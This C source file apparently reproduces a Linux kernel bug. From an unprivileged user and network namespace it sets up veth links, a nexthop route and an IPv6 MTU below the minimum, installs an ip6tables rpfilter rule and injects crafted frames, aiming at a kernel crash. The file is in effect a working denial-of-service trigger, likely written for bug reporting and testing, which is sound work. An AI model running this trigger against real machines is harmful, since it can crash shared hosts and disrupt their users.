// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <grp.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#include <linux/netfilter_ipv6/ip6_tables.h>
#include <linux/netfilter/x_tables.h>
#include <linux/netfilter/xt_rpfilter.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/nexthop.h>
#include <linux/veth.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/sockios.h>

#ifndef NHA_ID
#define NHA_ID 1
#endif
#ifndef RTA_NH_ID
#define RTA_NH_ID 30
#endif

#define NH_ID		1
#define VR0		"vr0"
#define VR1		"vr1"
#define VA0		"va0"
#define VA1		"va1"

static int nl;

static void die(const char *m)
{
	fprintf(stderr, "[-] %s: %s\n", m, strerror(errno));
	exit(1);
}

struct nlreq {
	struct nlmsghdr n;
	unsigned char buf[2048];
};

static void addattr(struct nlmsghdr *n, int type, const void *data, int alen)
{
	struct rtattr *rta = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));

	rta->rta_type = type;
	rta->rta_len = RTA_LENGTH(alen);
	if (alen)
		memcpy(RTA_DATA(rta), data, alen);
	n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(RTA_LENGTH(alen));
}

static void addu32(struct nlmsghdr *n, int type, unsigned int v)
{
	addattr(n, type, &v, 4);
}

static struct rtattr *nest_start(struct nlmsghdr *n, int type)
{
	struct rtattr *nest = (struct rtattr *)((char *)n + NLMSG_ALIGN(n->nlmsg_len));

	addattr(n, type, NULL, 0);
	return nest;
}

static void nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
	nest->rta_len = (char *)n + NLMSG_ALIGN(n->nlmsg_len) - (char *)nest;
}

static void nl_open(void)
{
	struct sockaddr_nl sa;

	nl = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_ROUTE);
	if (nl < 0)
		die("socket(NETLINK_ROUTE)");
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(nl, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind(netlink)");
}

static int nl_talk(struct nlmsghdr *n, const char *what)
{
	static unsigned int seq = 1;
	char rbuf[8192];
	struct nlmsghdr *r;
	int len;

	n->nlmsg_seq = ++seq;
	n->nlmsg_pid = 0;
	if (send(nl, n, n->nlmsg_len, 0) < 0)
		die("send(netlink)");

	for (;;) {
		len = recv(nl, rbuf, sizeof(rbuf), 0);
		if (len < 0)
			die("recv(netlink)");
		for (r = (struct nlmsghdr *)rbuf; NLMSG_OK(r, (unsigned)len);
		     r = NLMSG_NEXT(r, len)) {
			if (r->nlmsg_seq != n->nlmsg_seq)
				continue;
			if (r->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *e = NLMSG_DATA(r);

				if (e->error)
					fprintf(stderr, "[-] %s: %s\n", what,
						strerror(-e->error));
				else
					printf("[+] %s\n", what);
				return e->error;
			}
			if (r->nlmsg_type == NLMSG_DONE)
				return 0;
		}
	}
}

static int ifindex(const char *name)
{
	struct ifreq ifr;
	int s, r;

	s = socket(AF_INET6, SOCK_DGRAM, 0);
	if (s < 0)
		die("socket(AF_INET6)");
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	r = ioctl(s, SIOCGIFINDEX, &ifr);
	close(s);
	if (r < 0)
		die("SIOCGIFINDEX");
	return ifr.ifr_ifindex;
}

static void veth_add(const char *a, const char *b)
{
	struct nlreq req;
	struct ifinfomsg *ifi, peer;
	struct rtattr *li, *id, *pn;

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	req.n.nlmsg_type = RTM_NEWLINK;
	ifi = NLMSG_DATA(&req.n);
	ifi->ifi_family = AF_UNSPEC;

	addattr(&req.n, IFLA_IFNAME, a, strlen(a) + 1);
	li = nest_start(&req.n, IFLA_LINKINFO);
	addattr(&req.n, IFLA_INFO_KIND, "veth", 5);
	id = nest_start(&req.n, IFLA_INFO_DATA);
	pn = nest_start(&req.n, VETH_INFO_PEER);

	memset(&peer, 0, sizeof(peer));
	memcpy((char *)&req.n + NLMSG_ALIGN(req.n.nlmsg_len), &peer, sizeof(peer));
	req.n.nlmsg_len = NLMSG_ALIGN(req.n.nlmsg_len) + sizeof(peer);
	addattr(&req.n, IFLA_IFNAME, b, strlen(b) + 1);

	nest_end(&req.n, pn);
	nest_end(&req.n, id);
	nest_end(&req.n, li);

	if (nl_talk(&req.n, "create veth pair"))
		exit(1);
}

static void link_up(const char *name)
{
	struct nlreq req;
	struct ifinfomsg *ifi;

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req.n.nlmsg_type = RTM_NEWLINK;
	ifi = NLMSG_DATA(&req.n);
	ifi->ifi_family = AF_UNSPEC;
	ifi->ifi_index = ifindex(name);
	ifi->ifi_flags = IFF_UP;
	ifi->ifi_change = IFF_UP;

	if (nl_talk(&req.n, "link up"))
		exit(1);
}

static int link_mtu(const char *name, int mtu)
{
	struct nlreq req;
	struct ifinfomsg *ifi;

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req.n.nlmsg_type = RTM_NEWLINK;
	ifi = NLMSG_DATA(&req.n);
	ifi->ifi_family = AF_UNSPEC;
	ifi->ifi_index = ifindex(name);
	addu32(&req.n, IFLA_MTU, mtu);

	return nl_talk(&req.n, "shrink MTU below IPV6_MIN_MTU");
}

static void addr6_add(const char *name, const char *addr, int plen)
{
	struct nlreq req;
	struct ifaddrmsg *ifa;
	struct in6_addr a;

	memset(&a, 0, sizeof(a));
	if (inet_pton(AF_INET6, addr, &a) != 1)
		die("inet_pton");

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifaddrmsg));
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_REPLACE;
	req.n.nlmsg_type = RTM_NEWADDR;
	ifa = NLMSG_DATA(&req.n);
	ifa->ifa_family = AF_INET6;
	ifa->ifa_prefixlen = plen;
	ifa->ifa_index = ifindex(name);
	addattr(&req.n, IFA_LOCAL, &a, 16);
	addattr(&req.n, IFA_ADDRESS, &a, 16);

	nl_talk(&req.n, "add ipv6 address");
}

static void nexthop_add(unsigned int id, const char *dev)
{
	struct nlreq req;
	struct nhmsg *nhm;

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct nhmsg));
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_REPLACE;
	req.n.nlmsg_type = RTM_NEWNEXTHOP;
	nhm = NLMSG_DATA(&req.n);
	nhm->nh_family = AF_INET6;
	nhm->nh_scope = RT_SCOPE_UNIVERSE;
	nhm->nh_protocol = RTPROT_STATIC;

	addu32(&req.n, NHA_ID, id);
	addu32(&req.n, NHA_OIF, ifindex(dev));

	if (nl_talk(&req.n, "create nexthop object"))
		exit(1);
}

static void route6_add_nhid(const char *pfx, int plen, unsigned int nhid)
{
	struct nlreq req;
	struct rtmsg *rtm;
	struct in6_addr a;

	memset(&a, 0, sizeof(a));
	if (inet_pton(AF_INET6, pfx, &a) != 1)
		die("inet_pton");

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	req.n.nlmsg_type = RTM_NEWROUTE;
	rtm = NLMSG_DATA(&req.n);
	rtm->rtm_family = AF_INET6;
	rtm->rtm_dst_len = plen;
	rtm->rtm_table = RT_TABLE_MAIN;
	rtm->rtm_protocol = RTPROT_STATIC;
	rtm->rtm_scope = RT_SCOPE_UNIVERSE;
	rtm->rtm_type = RTN_UNICAST;

	addattr(&req.n, RTA_DST, &a, 16);
	addu32(&req.n, RTA_NH_ID, nhid);

	if (nl_talk(&req.n, "add route via nexthop id"))
		exit(1);
}

static int route_present(const char *pfx, int plen)
{
	struct nlreq req;
	struct rtmsg *rtm;
	struct in6_addr want;
	char rbuf[16384];
	int found = 0, done = 0, len;

	memset(&want, 0, sizeof(want));
	inet_pton(AF_INET6, pfx, &want);

	memset(&req, 0, sizeof(req));
	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct rtmsg));
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_DUMP;
	req.n.nlmsg_type = RTM_GETROUTE;
	req.n.nlmsg_seq = 0xbeef;
	rtm = NLMSG_DATA(&req.n);
	rtm->rtm_family = AF_INET6;

	if (send(nl, &req.n, req.n.nlmsg_len, 0) < 0)
		die("send(dump)");

	while (!done) {
		struct nlmsghdr *r;

		len = recv(nl, rbuf, sizeof(rbuf), 0);
		if (len <= 0)
			break;
		for (r = (struct nlmsghdr *)rbuf; NLMSG_OK(r, (unsigned)len);
		     r = NLMSG_NEXT(r, len)) {
			struct rtattr *rta;
			int rlen;

			if (r->nlmsg_type == NLMSG_DONE || r->nlmsg_type == NLMSG_ERROR) {
				done = 1;
				break;
			}
			if (r->nlmsg_type != RTM_NEWROUTE)
				continue;
			rtm = NLMSG_DATA(r);
			if (rtm->rtm_dst_len != plen)
				continue;
			rta = (struct rtattr *)((char *)rtm + NLMSG_ALIGN(sizeof(*rtm)));
			rlen = r->nlmsg_len - NLMSG_LENGTH(sizeof(*rtm));
			for (; RTA_OK(rta, rlen); rta = RTA_NEXT(rta, rlen)) {
				if (rta->rta_type == RTA_DST &&
				    RTA_PAYLOAD(rta) == 16 &&
				    !memcmp(RTA_DATA(rta), &want, 16))
					found = 1;
			}
		}
	}
	return found;
}

#define MATCH_HDR	XT_ALIGN(sizeof(struct xt_entry_match))
#define TARGET_HDR	XT_ALIGN(sizeof(struct xt_entry_target))
#define ENTRY_SZ	XT_ALIGN(sizeof(struct ip6t_entry))
#define RPF_MATCH_SZ	(MATCH_HDR + XT_ALIGN(sizeof(struct xt_rpfilter_info)))
#define STD_TARGET_SZ	(TARGET_HDR + XT_ALIGN(sizeof(int)))
#define ERR_TARGET_SZ	(TARGET_HDR + XT_ALIGN(XT_FUNCTION_MAXNAMELEN))

#define VERDICT_ACCEPT	(-NF_ACCEPT - 1)

static void install_rpfilter_rule(void)
{
	unsigned char blob[4096];
	unsigned int o_rule, o_pre_pol, o_out_pol, o_err, total;
	struct ip6t_entry *e;
	struct xt_entry_match *m;
	struct xt_standard_target *st;
	struct xt_error_target *et;
	struct xt_rpfilter_info *rpf;
	struct ip6t_getinfo info;
	struct ip6t_replace *repl;
	socklen_t sl;
	int s;

	s = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
	if (s < 0) {
		s = socket(AF_INET6, SOCK_DGRAM, 0);
		if (s < 0)
			die("socket for ip6tables");
	}

	memset(&info, 0, sizeof(info));
	strcpy(info.name, "raw");
	sl = sizeof(info);
	if (getsockopt(s, IPPROTO_IPV6, IP6T_SO_GET_INFO, &info, &sl) < 0)
		die("IP6T_SO_GET_INFO(raw) - is CONFIG_IP6_NF_RAW enabled?");
	printf("[*] raw table: %u entries, size %u, valid_hooks %#x\n",
	       info.num_entries, info.size, info.valid_hooks);

	memset(blob, 0, sizeof(blob));

	o_rule    = 0;
	o_pre_pol = o_rule + ENTRY_SZ + RPF_MATCH_SZ + STD_TARGET_SZ;
	o_out_pol = o_pre_pol + ENTRY_SZ + STD_TARGET_SZ;
	o_err     = o_out_pol + ENTRY_SZ + STD_TARGET_SZ;
	total     = o_err + ENTRY_SZ + ERR_TARGET_SZ;

	e = (struct ip6t_entry *)(blob + o_rule);
	e->target_offset = ENTRY_SZ + RPF_MATCH_SZ;
	e->next_offset = ENTRY_SZ + RPF_MATCH_SZ + STD_TARGET_SZ;

	m = (struct xt_entry_match *)(blob + o_rule + ENTRY_SZ);
	m->u.user.match_size = RPF_MATCH_SZ;
	strcpy(m->u.user.name, "rpfilter");
	m->u.user.revision = 0;
	rpf = (struct xt_rpfilter_info *)m->data;
	rpf->flags = XT_RPFILTER_LOOSE;

	st = (struct xt_standard_target *)(blob + o_rule + e->target_offset);
	st->target.u.user.target_size = STD_TARGET_SZ;
	st->target.u.user.name[0] = '\0';
	st->verdict = VERDICT_ACCEPT;

	e = (struct ip6t_entry *)(blob + o_pre_pol);
	e->target_offset = ENTRY_SZ;
	e->next_offset = ENTRY_SZ + STD_TARGET_SZ;
	st = (struct xt_standard_target *)(blob + o_pre_pol + ENTRY_SZ);
	st->target.u.user.target_size = STD_TARGET_SZ;
	st->verdict = VERDICT_ACCEPT;

	e = (struct ip6t_entry *)(blob + o_out_pol);
	e->target_offset = ENTRY_SZ;
	e->next_offset = ENTRY_SZ + STD_TARGET_SZ;
	st = (struct xt_standard_target *)(blob + o_out_pol + ENTRY_SZ);
	st->target.u.user.target_size = STD_TARGET_SZ;
	st->verdict = VERDICT_ACCEPT;

	e = (struct ip6t_entry *)(blob + o_err);
	e->target_offset = ENTRY_SZ;
	e->next_offset = ENTRY_SZ + ERR_TARGET_SZ;
	et = (struct xt_error_target *)(blob + o_err + ENTRY_SZ);
	et->target.u.user.target_size = ERR_TARGET_SZ;
	strcpy(et->target.u.user.name, XT_ERROR_TARGET);
	strcpy(et->errorname, "ERROR");

	repl = calloc(1, sizeof(*repl) + total);
	if (!repl)
		die("calloc");
	strcpy(repl->name, "raw");
	repl->valid_hooks = (1 << NF_INET_PRE_ROUTING) | (1 << NF_INET_LOCAL_OUT);
	repl->num_entries = 4;
	repl->size = total;
	repl->hook_entry[NF_INET_PRE_ROUTING] = o_rule;
	repl->underflow[NF_INET_PRE_ROUTING] = o_pre_pol;
	repl->hook_entry[NF_INET_LOCAL_OUT] = o_out_pol;
	repl->underflow[NF_INET_LOCAL_OUT] = o_out_pol;
	repl->num_counters = info.num_entries;
	repl->counters = calloc(info.num_entries, sizeof(struct xt_counters));
	memcpy(repl->entries, blob, total);

	if (setsockopt(s, IPPROTO_IPV6, IP6T_SO_SET_REPLACE, repl,
		       sizeof(*repl) + total) < 0)
		die("IP6T_SO_SET_REPLACE");
	printf("[+] installed 'raw PREROUTING -m rpfilter --loose -j ACCEPT'\n");
	close(s);
}

static void inject(int n)
{
	unsigned char frame[62];
	struct sockaddr_ll sll;
	struct in6_addr src, dst;
	int s, i;

	s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0)
		die("socket(AF_PACKET)");

	inet_pton(AF_INET6, "2001:db8:1::1234", &src);
	inet_pton(AF_INET6, "ff02::1", &dst);

	memset(frame, 0, sizeof(frame));

	frame[0] = 0x33; frame[1] = 0x33;
	frame[2] = 0x00; frame[3] = 0x00; frame[4] = 0x00; frame[5] = 0x01;
	frame[6] = 0x02; frame[11] = 0x01;
	frame[12] = 0x86; frame[13] = 0xdd;

	frame[14] = 0x60;
	frame[18] = 0x00; frame[19] = 0x08;
	frame[20] = IPPROTO_UDP;
	frame[21] = 64;
	memcpy(frame + 22, &src, 16);
	memcpy(frame + 38, &dst, 16);

	frame[54] = 0x30; frame[55] = 0x39;
	frame[56] = 0x30; frame[57] = 0x3a;
	frame[58] = 0x00; frame[59] = 0x08;

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex(VA0);
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, frame, 6);

	printf("[*] injecting %d frames with saddr 2001:db8:1::1234 on %s\n", n, VA0);
	fflush(stdout);
	for (i = 0; i < n; i++) {
		if (sendto(s, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die("sendto(AF_PACKET)");
		usleep(20000);
	}
	close(s);
}

static void wfile(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);

	if (fd < 0)
		return;
	write(fd, val, strlen(val));
	close(fd);
}

int main(void)
{
	char map[64];
	uid_t uid = 1000, gid = 1000;

	setvbuf(stdout, NULL, _IONBF, 0);

	if (getuid() == 0) {
		setgroups(0, NULL);
		if (setresgid(gid, gid, gid) || setresuid(uid, uid, uid))
			die("drop privileges");

		prctl(PR_SET_DUMPABLE, 1, 0, 0, 0);
	}
	printf("[*] running as uid=%d gid=%d\n", getuid(), getgid());

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET))
		die("unshare(CLONE_NEWUSER|CLONE_NEWNET)");
	wfile("/proc/self/setgroups", "deny");
	snprintf(map, sizeof(map), "0 %d 1\n", uid);
	wfile("/proc/self/uid_map", map);
	snprintf(map, sizeof(map), "0 %d 1\n", gid);
	wfile("/proc/self/gid_map", map);
	printf("[*] in userns+netns, euid=%d\n", geteuid());

	nl_open();

	veth_add(VR0, VR1);
	veth_add(VA0, VA1);
	link_up(VR0);
	link_up(VR1);
	link_up(VA0);
	link_up(VA1);
	addr6_add(VR0, "2001:db8:ff::1", 64);
	addr6_add(VA1, "2001:db8:ee::1", 64);

	nexthop_add(NH_ID, VR0);
	route6_add_nhid("2001:db8:1::", 64, NH_ID);

	if (link_mtu(VR0, 1000))
		exit(1);

	printf("[*] route 2001:db8:1::/64 still installed: %s\n",
	       route_present("2001:db8:1::", 64) ? "yes" : "NO");

	install_rpfilter_rule();

	inject(20);

	printf("[-] no crash\n");
	return 0;
}
